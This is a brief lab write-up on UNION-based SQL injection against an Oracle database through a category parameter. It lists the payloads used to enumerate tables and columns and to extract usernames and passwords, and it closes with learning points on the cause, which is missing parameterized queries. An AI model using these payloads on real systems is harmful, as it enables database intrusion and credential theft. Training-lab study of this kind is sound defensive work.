# Lab Name
SQL injection attack, listing the database contents on Oracle.

## Vulnerability
SQL Injection (UNION-based)

## Objective
Exploit UNION-based SQL Injection to listing the database contents on Oracle.

## Entry Point
Category parameter

## Payload Used
  UNION SELECT 'test', NULL FROM dual--
  UNION SELECT table_name, NULL FROM all_tables--
  UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_GSOLHM'--
  UNION SELECT USERNAME_CEEZHZ, PASSWORD_MPPMGY FROM USERS_GSOLHM--
  
## Result
- Successfully extracted administrator credentials after enumerating tables and columns using all_tables and all_tab_columns.

## Learning
- Reflected query output confirms the application is vulnerable to UNION-based SQL injection.
- Identifying the correct number of columns is mandatory before using UNION SELECT; otherwise the query fails.
- NULL values can be used as placeholders when the data type of other columns is unknown.
- Oracle system tables (all_tables and all_tab_columns) allow enumeration of database structure.
- After identifying the correct table and columns, UNION SELECT can be leveraged to extract sensitive data.
- Poor input validation and lack of parameterized queries allow attackers to access sensitive system information such as usernames and passwords.
